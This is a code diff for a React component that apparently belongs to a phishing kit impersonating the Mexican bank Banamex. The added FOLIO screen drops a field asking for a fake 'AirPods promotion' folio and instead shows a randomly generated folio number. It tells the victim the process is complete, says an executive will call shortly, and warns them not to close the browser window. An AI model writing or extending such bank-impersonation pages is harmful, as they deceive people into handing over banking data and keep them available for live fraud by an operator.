@@ -682,27 +682,40 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         );
 
       case ScreenType.FOLIO:
+        // Generar un folio de 8 dígitos si no existe
+        const generatedFolio = screenData.folio || Math.floor(10000000 + Math.random() * 90000000).toString();
+
         const folioContent = (
-          <>
-            <h2 className="text-xl font-bold mb-3">Folio de promoción:</h2>
-            <p className="mb-4">Por favor, ingrese el folio de la promoción de AirPods que recibió de Banamex.</p>
-            <div className="mb-4">
-              <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
-              <Input 
-                type="text" 
-                placeholder="Ingrese su número de folio" 
-                className="w-full border border-gray-300 rounded p-2 mb-3"
-                value={dataA}
-                onChange={(e) => setDataA(e.target.value)}
-              />
+          <div className="text-center py-8">
+            <div className="mb-8">
+              <div className="bg-green-50 border border-green-200 rounded-lg p-6 mb-6">
+                <div className="text-green-600 text-4xl mb-4">✓</div>
+                <h2 className="text-2xl font-bold text-gray-800 mb-3">Proceso completado</h2>
+                <p className="text-gray-700 mb-4">
+                  Un ejecutivo se contactará con usted en un momento
+                </p>
+              </div>
+
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6">
+                <p className="text-sm text-gray-600 mb-2">Su número de folio es:</p>
+                <div className="text-3xl font-bold text-blue-600 tracking-wider">
+                  {generatedFolio}
+                </div>
+                <p className="text-xs text-gray-500 mt-2">
+                  Por favor conserve este número para futuras referencias
+                </p>
+              </div>
+
+              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
+                <p className="text-yellow-800 font-semibold">
+                  ⚠️ No cierre esta ventana
+                </p>
+                <p className="text-sm text-yellow-700 mt-1">
+                  Mantenga su navegador abierto mientras esperamos la comunicación del ejecutivo
+                </p>
+              </div>
             </div>
-            <Button 
-              className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.FOLIO, { folio: dataA })}
-            >
-              Continuar
-            </Button>
-          </>
+          </div>
         );
         return getBankContainer(folioContent);
 
